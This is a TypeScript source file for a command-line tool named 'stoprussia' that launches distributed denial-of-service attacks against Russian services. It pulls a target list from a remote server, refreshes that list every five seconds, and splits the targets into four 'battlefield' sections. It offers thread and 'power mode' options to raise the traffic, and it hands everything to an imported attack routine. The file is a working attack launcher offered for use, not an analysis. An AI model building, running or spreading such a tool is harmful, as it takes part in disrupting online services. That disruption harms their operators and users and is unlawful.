import { start } from '@0x77/stoprussia';
import { Command, flags } from '@oclif/command'
import fetch from 'node-fetch'

function* getChunks<T = any>(arr: T[], n: number) {
  for (let i = 0; i < arr.length; i += n) {
    yield arr.slice(i, i + n);
  }
}

const startAttack = async (targets: string[], version: number, flags: {
  version: void;
  help: void;
  threads: number;
  power: boolean
  battlefield: number | undefined;
}) => {
  if (flags.threads > 4) {
    console.error('threads max is 4')
    process.exit()
  }

  if (flags.battlefield && flags.battlefield > 4) {
    console.error('battlefield max is 4')
    process.exit()
  }

  if(flags.power) {
    flags.threads = flags.threads * 2
    console.warn('Warning: Power mode enabled! Do not use it in Ukraine! This mode requires a lot of network throughput')
  }

  const battlefield = flags.battlefield ? flags.battlefield - 1 : new Date().getSeconds() % 4

  console.log('Got targets list', targets.length, version)
  targets = Array.from([...getChunks(targets, Math.floor(targets.length/4))][battlefield])
  console.log(`\tbattlefield: ${battlefield + 1}\n`, `\ttargets: ${targets.length}`)

  return start(targets, flags.threads, console.log)
}

class StopRussia extends Command {
  static description = 'start attack against russian services'

  static flags = {
    version: flags.version({ char: 'v' }),
    help: flags.help({ char: 'h' }),
    threads: flags.integer({ char: 't', default: 1 }),
    power: flags.boolean({ char: 'p', description: 'power mode, will use a lot of traffic, do not use in Ukraine!', default: false }),
    battlefield: flags.integer({ char: 'b', description: 'number to section to attack, min: 1 / max: 4' })
  }

  async run() {
    console.log('https://github.com/0x77dev/stoprussia')
    const { flags } = this.parse(StopRussia)

    const res = await fetch('https://srl.0x77.dev')
    let srl = await res.json() as { targets: string[]; version: number }
    let stop = await startAttack(srl.targets, srl.version, flags)

    setInterval(async () => {
      try {
        const res = await fetch('https://srl.0x77.dev')
        let { targets, version } = await res.json() as { targets: string[]; version: number }

        if (version > srl.version) {
          srl.targets = targets
          srl.version = version

          console.log('Reloading')
          await stop()
          stop = await startAttack(srl.targets, srl.version, flags)
        }
      } catch (error) {
        console.warn('Refreshing targets list error', error)
      }
    }, 5000)

    process.on('SIGINT', async () => {
      await stop()
      process.exit()
    })
  }
}

export = StopRussia
